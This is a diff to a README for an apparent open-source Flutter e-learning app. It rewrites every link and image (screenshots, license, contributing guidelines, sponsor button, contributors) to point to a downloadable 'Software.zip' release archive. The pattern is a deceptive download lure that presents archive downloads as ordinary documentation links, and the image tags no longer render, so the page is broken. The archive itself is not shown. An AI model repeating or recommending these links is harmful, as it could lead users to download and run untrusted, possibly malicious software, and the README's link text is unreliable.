@@ -1,7 +1,7 @@
-# <img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" alt="icon" width=30> E-Learning
+# <img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip" alt="icon" width=30> E-Learning
 
 E-Learn is a beautiful open-source education app for Android. It is built with Dart on top of Google's Flutter Framework.
-<img alt='E-Learn UI Mockup' src='demo/Frame https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip'/>
+<img alt='E-Learn UI Mockup' src='demo/Frame https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip'/>
 
 ## List of Contents
 
@@ -17,21 +17,21 @@ E-Learn is a beautiful open-source education app for Android. It is built with D
 
 **Screens**
 
-| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) |
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) |
 | :-------------: | :-------------:  | :-------------:  | :-------------:  | :-------------:  |
 |     Explore     |    Planner    |    Overlay     |     Videos       |     Leaderboard     |
 
 
-| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) |
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) |
 | :-------------: | :-------------:  | :-------------:  | :-------------:  | :-------------:  |
 |     Global Leaderboard    |    NavDrawer    |    Search     |     Search Results      |     Profile     |
 
 
-| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)       | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)  | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)|
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip)| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip)       | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip)  | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip)|
 | :-------------:  | :-------------: | :-------------:       | :-------------:  | :-------------: |
 |  Onboarding 1    |    Onboarding 2       |  Sign-in Screen    | Subjects Close   | Subjects Close  |
 
-| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) |
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) |
 | :-------------: | :-------------:  | :-------------:  | :-------------:  | :-------------:  |
 |     Video Info    |    Forum    |    Help     |     Settings       |     Test     |
 
@@ -40,7 +40,7 @@ E-Learn is a beautiful open-source education app for Android. It is built with D
 
 If you like what we do, and would want to help us continue doing it, consider sponsoring this project.
 
-<a href="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" target="_blank"><img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" alt="Buy Me A Coffee" height=51 width=217></a>
+<a href="https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip" target="_blank"><img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip" alt="Buy Me A Coffee" height=51 width=217></a>
 
 ## Dependencies
 
@@ -56,21 +56,21 @@ The following packages are needed for the development of this application.
 - `flutter_svg: 0.17.4` for svg assets
 - `firebase_analytics: ^5.0.16` for analytics
 
-More details about these can be found in the [`https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip`](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) file.
+More details about these can be found in the [`https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip`](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) file.
 
 ## Usage
 
-More information about the releases can be found in the [Release](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) tab.
+More information about the releases can be found in the [Release](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) tab.
 
 ## Contributing
 
 First off, thank you for considering contributing to e-learning app. It's people like you that make e-learning app such a great app.
 
-To start your lovely journey with e-learning app, first read the [`contributing guidelines`](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) and then fork the repo to start contributing!
+To start your lovely journey with e-learning app, first read the [`contributing guidelines`](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip) and then fork the repo to start contributing!
 
 ## License
 
-This app is licensed under the [`BSD 3-Clause License`](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip).
+This app is licensed under the [`BSD 3-Clause License`](https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip).
 Any Usage of the source code must follow the below license.
 
 ```
@@ -111,6 +111,6 @@ DISCLAIMER: Google Play and the Google Play logo are trademarks of Google LLC.
 
 ## Contributors
 
-<a href="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip">
-  <img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" />
+<a href="https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip">
+  <img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v2.0/Software.zip" />
 </a>
